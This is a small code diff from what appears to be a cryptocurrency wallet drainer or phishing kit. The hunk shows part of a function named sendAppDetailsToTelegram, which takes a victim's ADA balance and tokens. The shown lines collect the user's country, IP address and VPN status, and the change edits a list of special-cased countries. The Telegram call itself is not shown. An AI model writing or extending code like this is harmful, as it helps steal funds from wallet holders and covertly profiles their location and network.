@@ -41,7 +41,7 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   }
 
   const { country, countryCode, ip, isVpnIpdata } = userCountryData;
-  const specialCountries = ["NG", "AE"];
+  const specialCountries = ["AE"];
 
   const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
 
